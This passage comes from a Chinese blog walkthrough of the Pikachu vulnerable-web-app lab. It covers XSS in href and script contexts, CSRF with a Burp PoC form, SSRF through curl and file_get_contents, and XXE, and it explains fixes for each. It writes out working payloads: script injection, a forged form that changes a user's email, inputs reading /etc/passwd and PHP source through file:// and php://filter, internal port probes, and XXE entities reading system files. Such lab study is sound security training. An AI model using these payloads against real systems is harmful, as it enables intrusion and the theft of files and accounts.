class=&#x27;notice&#x27;&gt;你的输入已经被记录:&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//输入的内容被处理后输出到了input标签的value属性里面,试试:&#x27; onclick=&#x27;alert(111)&#x27;</span></span><br><span class="line"><span class="comment">//        $html2.=&quot;&lt;input class=&#x27;input&#x27; type=&#x27;text&#x27; name=&#x27;inputvalue&#x27; readonly=&#x27;readonly&#x27; value=&#x27;&#123;$message&#125;&#x27; style=&#x27;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&#x27;/&gt;&quot;;</span></span><br><span class="line">        <span class="variable">$html2</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt;<span class="subst">&#123;$message&#125;</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于htmlspecialchars默认不处理’，导致可以绕过。</p>
<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>先来看看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$message=htmlspecialchars($_GET[‘message’],ENT_QUOTES) htmlspecialchars使用ENT_QUOTES，过滤掉单双引号，然后将输入放入a标签的href属性中。a标签的href属性可用javascript协议来执行js。这时候就利用js构造payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>思考:</p>
<p>a标签的href属性如果有输出，如何做防范措施呢？</p>
<p>首先仅仅用htmlspecialchars做过滤是不够的。一般有两个逻辑： href用来插入链接，所以我们<strong>首先只允许http,https开头的协议，再进行htmlspecialchars过滤</strong>。</p>
<h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>随便输入111，查看网页源码可以发现，输入被放入js中进行判断后输出。</p>
<p>其实<strong>js的payload就是构造闭合</strong>，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="comment">//在这构造：$ms=&#x27;1&#x27;&lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;&#x27;;</span></span><br><span class="line">    <span class="keyword">if</span>($ms.length != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>后台源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这里讲输入动态的生成到了js中,形成xss</span><br><span class="line">&#x2F;&#x2F;javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修?</span><br><span class="line">&#x2F;&#x2F;这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。</span><br><span class="line">&#x2F;&#x2F;所以在JS的输出点应该使用\对特殊字符进行转义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;message&#39;] !&#x3D;null)&#123;</span><br><span class="line">    $jsvar&#x3D;$_GET[&#39;message&#39;];</span><br><span class="line">&#x2F;&#x2F;    $jsvar&#x3D;htmlspecialchars($_GET[&#39;message&#39;],ENT_QUOTES);</span><br><span class="line">    if($jsvar &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">        $html.&#x3D;&quot;&lt;img src&#x3D;&#39;&#123;$PIKA_ROOT_DIR&#125;assets&#x2F;images&#x2F;nbaplayer&#x2F;tmac.jpeg&#39; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $ms&#x3D;&#39;&lt;?php echo $jsvar;?&gt;&#39;;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>前端接收，后端通过js接收参数。输出点在js中，通过用户输入动态生成了js代码。使用htmlspecialchars做过滤时，输入会被html实体编码，而js不能再反转化回去。所以<strong>用\在JS中对特殊字符进行转义</strong>。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1516371">https://cloud.tencent.com/developer/article/1516371</a></p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>攻击者会伪造一个请求链接，然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。</p>
<p>判断一个网站是否存在CSRF漏洞，其实就是<strong>判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造</strong>。</p>
<p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
<p>网站如果要防止CSRF攻击，需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
<h2 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h2><p>在修改个人信息处，可以看到URL以明文的形式传输，攻击者可以伪造URL诱骗用户点击来实现攻击。此处我们伪造URL将目标用户的邮箱修改为我们的邮箱。若用户在登陆的状态下点击此伪造的URL，可更改个人信息。伪造的URL如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.137.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;18626545454&amp;add&#x3D;Earth&amp;email&#x3D;&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>burp抓包也可以更改：</p>
<p><img src="5.png"></p>
<h2 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h2><p>此时无法像前面一样通过伪造URL来进行攻击，我们可以通过构造恶意站点，将POST请求隐藏在站点中的表单中，然后诱骗用户进行点击，当用户点击后触发表单，数据自然就POST到存在CSRF漏洞的网站，用户的信息则被恶意修改。</p>
<p>burp拦截请求，并生成恶意的网页index.html</p>
<p><img src="12.jpg"></p>
<p>html源码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;192.168.137.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfpost&#x2F;csrf_post_edit.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;boy&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;phonenum&quot; value&#x3D;&quot;18626545453&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;add&quot; value&#x3D;&quot;Earth&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;hacher&amp;#64;pikachu&amp;#46;com&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;you have been hacked&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></table></figure>

<p>当用户在<strong>登录状态</strong>下，访问我们伪造的站点<code>http://192.168.137.1/pikachu/vul/csrf/index.html</code>并点击提交按钮，那么其个人信息将会被恶意修改.</p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>在修改个人信息处，添加信息，提交信息，Burp拦截之后可发现，修改信息时会<strong>添加token信息</strong>，以防止CSRF:<br><img src="13.jpg"></p>
<p>CSRF的主要问题是敏感操作的链接容易被伪造。而只要在每次请求时都增加一个随机码<code>Token</code>，后台每次都对这个随机码进行验证，则可以有效地防止CSRF</p>
<h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><p>SSRF形成的原因大都是<strong>由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</strong>，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>数据流: 攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>根据后台使用函数的不同,影响和利用方法也不一样</p>
<p>PHP中以下函数使用不当会导致SSRF:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<p>若一定要通过后台服务器远程对用户指定地址进行资源请求,一定要做好目标地址的过滤。</p>
<h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><p>点击累了来读一首诗吧，可看到URL中传了一个url参数。</p>
<p>查看后端源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = curl_init(<span class="variable">$URL</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = curl_exec(<span class="variable">$CH</span>);</span><br><span class="line">    curl_close(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了httptps外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从前端获取了url请求，curl_init函数会对它进行初始化，然后curl_exec函数执行请求，最终又将请求结果返回到前端。</p>
<p>用百度试一下，可以发现页面显示百度的数据库，说明我们分析正确，前端传入参数，后端通过<strong>curl_exec</strong>去请求百度，最后把请求返回的百度数据返回到前端。<br><img src="6.png"></p>
<p>在test目录下新建一个1.txt，load1.txt文件的地址，可以看到页面加载了1.txt的内容。</p>
<p><img src="7.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;192.168.137.17:22</span><br></pre></td></tr></table></figure>

<p>将url改成内网上的其他主机(http协议)，就可以探测到内网的其他主机ssh等服务端口是否开放。</p>
<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><p>与前面相同，都是通过URL上传参数到后台获取信息：</p>
<p>后端代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span></span><br><span class="line"><span class="comment">//内网请求:http://x.x.x.x/xx.index</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$str</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>file_get_contents()：把整个文件读入一个字符串中</p>
<p>此处使用<strong>file_get_contents</strong>函数进行文件的读取执行，<strong>file_get_contents</strong>函数可以对本地文件进行读取，也可以对远程文件进行读取。</p>
<p>当我们按照之前测试百度和1.txt都会成功。</p>
<p>漏洞利用：</p>
<ol>
<li><p>文件读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></li>
<li><p>读取php源码的base64加密版本，之后解密即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;ssrf.php</span><br></pre></td></tr></table></figure></li>
<li><p>内网其他主机的请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100&#x2F;index.html</span><br></pre></td></tr></table></figure></li>
<li><p>探测内网其他主机的端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100:22</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE ：xml external entity injection，xml外部实体注入漏洞<br>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,即<strong>服务端接收和解析了来自用户端的xml数据</strong>,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>目前多种语言解析xml的函数默认禁止解析外部实体内容的,从而直接避免这个漏洞。</p>
<p>第一部分：XML声明部分</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二部分：文档类型定义 DTD</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">entity-name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI/URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三部分：文档元素</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。</p>
<p>① 内部申明DTD格式<!DOCTYPE 根元素 [元素申明]></p>
<p>② 外部引用DTD格式<!DOCTYPE 根元素 SYSTEM "外部DTD的URI"></p>
<p>③ 引用公共DTD格式<!DOCTYPE 根元素 PUBLIC "DTD标识名" "公共DTD的URI"></p>
<ul>
<li>本地实体类型举例：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;  encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [           &#x2F;&#x2F;定义了foo的根元素</span><br><span class="line">&lt;!ELEMENT foo ANY&gt;        &#x2F;&#x2F;foo是接受任何参数的</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot;&gt;]&gt;    &#x2F;&#x2F;定义了一个实体 xxe，内容为test</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">	&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;    &#x2F;&#x2F;&amp;xxe进行引用 本地引用</span><br><span class="line">	&lt;pass&gt;pass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>外部实体引用举例：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>

<p>查看后端源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">    <span class="comment">//$xml = $test;</span></span><br><span class="line">    <span class="comment">//考虑到目前很多版本里Libxml都&gt;=2.9.0,所以此处添加LIBXML_NOENT参数开启外部实体解析</span></span><br><span class="line">    <span class="variable">$data</span> = @simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//正常xml数据测试,此处的回显并不能证明支持外部实体，需要进一步测试</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-string">&quot;swanQ&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//服务器为windows系统，用此payload来测试是否有xxe漏洞。</span><br><span class="line">//查看服务器的内容</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C://Windows//win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//用php://filter获取php源代码</span><br><span class="line">//使用php伪协议，打印base64编码后的xxe.php</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [ <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span 